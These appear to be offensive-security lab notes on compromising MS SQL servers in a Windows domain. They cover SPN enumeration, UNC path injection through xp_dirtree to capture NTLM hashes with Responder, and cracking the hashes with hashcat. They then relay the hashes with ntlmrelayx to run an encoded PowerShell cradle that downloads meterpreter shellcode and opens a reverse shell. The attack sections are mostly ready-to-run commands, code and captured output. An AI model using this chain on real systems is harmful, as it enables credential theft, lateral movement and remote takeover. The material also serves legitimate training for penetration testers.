# MS SQL 
The following conditions are assumed for this example:
- Compromised a workstation
- Control unprivileged domain user

# MS SQL Enumeration
- Use NMAP & target defalut port 1433
- A broader scope can reveal non default ports
- MSSQL integrated AD accounts will use an SPN
- Querying the domain controller for registered SPNs is stealthy.

## Query Domain Controller
Return a list of all SQL related SPNs. This is run from the compromised user
- Take note of which belong to administrator groups
- `-T` is the domain name
- `-Q` Is wildcard SPN

```sh
setspn -T corp1 -Q MSSQLSvc/*

Checking domain DC=corp1,DC=com
CN=SQLSvc,OU=corp1ServiceAccounts,OU=corp1Users,DC=corp1,DC=com
    MSSQLSVC/dc01.corp1.com:1433
    ...
```
What you are looking for:
- The name of the account
- Context (SVQLSVC)
- Groups (Administrators)

Example Output:
```sh
SevicePrincipalName: MSSQLSVC/dc01.corp1.com:1433
Name: SQLSVC 
MemberOf: CN=Administrators
```

## Authentication
To authenticate to a MSSQL server using C#:
[Code example](./Code/connect-db.cs)

Types of logins
- Local Server
- Local Windows Account
- Windows Authentication (Kerberos)


## Roles
- SA = System Administrator
- PUBLIC - Guest
- Kerberos will map to an SQL user
- Defaults to the guest account if there is no mapping.

## Create C# console application to authenticate
Connect to MSSQL database and enumerate account information.
[get-user-info.cs](./Code/get-user-info.cs)
- `master` is the default MSSQL database name.
- `Integrated Security` = `True` indicates windows (kereberos) authentication.
- All builtin users have access to the database by default.

## Pivoting with UNC Path Injection
Code execution on other servers in the environment.
[Cheat Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/SQL-Server---UNC-Path-Injection-Cheat-Sheet)
- Connect SQL server to SMB server we control to reveal NTLM hash
- Crack or relay

### 1. Force connection request to SMB
This can be done using `xp_dirtree` which lists all files in a given folder. If we use unprivileged access this command will tell the `SERVICE ACCOUNT(SA)` of the SQL server to list the contents of the share.
- Connect to responder ip address
```cs
String query = "EXEC master..xp_dirtree \"\\\\10.10.10.11\\\\test\";";
```

UNC Path: `\\hostname\folder\file`

If we supply an IP address as the hostname Windows will revert to NTLM authentication instead of kerberos.
[Code example](./Code/connect-smb.cs "Connect smb file")

### 2. Setup SMB Share
The quickest way to do this will be to use responder on Kali. 

Shutdown Samba on Kali, and start responder.
```sh
sudo systemctl stop smbd nmbd
sudo responder -I tun0
```
On the windows client start your console app which will initiate the connection
```cpp
testapp.exe
```

After a few seconds, you will see NTLMv2-SSPHash
```sh
[SMB] NTLMv2-SSP Client   : 192.168.65.5
[SMB] NTLMv2-SSP Username : CORP1\sqlsvc
[SMB] NTLMv2-SSP Hash     : sqlsvc::CORP1:fbe97d48d6c33130:E8D269DE6E95A3338F661A44545DFCB0:010100000000000080D1F7875B95DC01B32D45F91C30F0EE0000000002000800520050005900410001001E00570049004E002D00500044004C004A004F0032005600370038004F00510004003400570049004E002D00500044004C004A004F0032005600370038004F0051002E0052005000590041002E004C004F00430041004C000300140052005000590041002E004C004F00430041004C000500140052005000590041002E004C004F00430041004C000700080080D1F7875B95DC0106000400020000000800300030000000000000000000000000300000D9612B035631CC25294E01C82C45B54B7407DE5782B80042D960A8EA1C9D05400A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00340039002E00360035000000000000000000 
```

### 3. NetNTLM Cracking
Crack the hash using `hashcat` and verify if the resulting user has local admin or any other SA access.
`5600` - NetNTLM hash type
`--force` - needs to be specified because it's being run in a VM
```sh
hashcat -m 5600 hash.txt dict.txt --force
```

## Relay My Hash
Another method we can use without cracking is a Relay. 

A few conditions need to be met:
1. We have the NetNTLM hash of an account that has local administrator on another computer.
2. SMB Signing is NOT enabled. (enabled by default on domain controllers)

### Impacket
1. Generate a payload using msfvenom and save the hex value as a file called `run.txt`
2. Setup temporary webserver `python -m http.server 80`
2. Prepare payload and copy it into the [unsafe methods](../InitialAccess/CodeRunners/Powershell/unsafe-methods.ps1) powershell shellcode loader.
```sh
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f ps1
```
2. Base64 encode the file.
You can optionally download powershell on kali to do this.
```sh
base64 cradle.ps1
```
Same method in powershell
```py
 python3 -c "import base64; print(base64.b64encode('(New-Object System.Net.WebClient).DownloadString(\\'http://192.168.251.151/run.txt\\') | IEX'.encode('utf-16le')).decode())" KABOAGU
```

Create a multi-handler
```sh
sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 10.10.10.11; set LPORT 443; exploit"
```

Impacket Command where `xxx` is the result of your base64 encoding:
```sh
sudo impacket -ntlmrelayx --no-http-server -smb2support -t 10.10.10.10 -c 'powershell enc xxxxx'
```

Execute on Windows host. Result will be a reverse shell.
```
relay.exe
```
